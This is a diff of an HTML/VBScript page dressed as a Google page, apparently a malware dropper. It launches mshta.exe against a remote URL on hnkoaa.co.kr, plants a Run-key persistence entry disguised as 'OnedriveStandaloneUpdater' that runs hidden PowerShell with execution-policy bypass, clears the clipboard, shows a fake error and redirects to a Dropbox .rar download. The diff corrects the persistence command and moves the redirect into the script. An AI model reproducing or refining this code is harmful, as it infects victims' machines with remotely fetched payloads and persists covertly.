@@ -54,13 +54,15 @@
         
         Set objShell = CreateObject("WScript.Shell")
         objShell.Run "mshta.exe http://hnkoaa.co.kr/files/2023/12/01/1.html", 0, False 
-		objShell.Run "cmd.exe, /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OnedriveStandaloneUpdater /t REG_SZ /d ""c:\windows\system32\cmd.exe /c Powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 473925 2.2.2.2 || mshta http://hnkoaa.co.kr/files/2023/12/01/1.html"" /f", 0, False
+		objShell.Run "cmd.exe /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OnedriveStandaloneUpdater /t REG_SZ /d ""c:\windows\system32\cmd.exe /c Powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 473925 2.2.2.2 || mshta http://hnkoaa.co.kr/files/2023/12/01/1.html"" /f", 0, False
         
         ClearClipboard
         
         objShell.Run "timeout /T 2 /nobreak", 0, True
         Call HideConnectingShowError
         objShell.Run "timeout /T 1 /nobreak", 0, True
+
+		location.href="https://www.dropbox.com/scl/fi/707zupq47cfmu3vnlwodi/.rar?rlkey=yzx0l304wszm3t0okw8m4bea2&e=1&st=ohyfxzfz&dl=0"
     End Sub
 
     Sub HideConnectingShowError
@@ -88,8 +90,5 @@
         <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - 
         <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
     </p>
-	<script>
-		location.href="https://www.dropbox.com/scl/fi/707zupq47cfmu3vnlwodi/.rar?rlkey=yzx0l304wszm3t0okw8m4bea2&e=1&st=ohyfxzfz&dl=0";
-	</script>
 </body>
 </html>
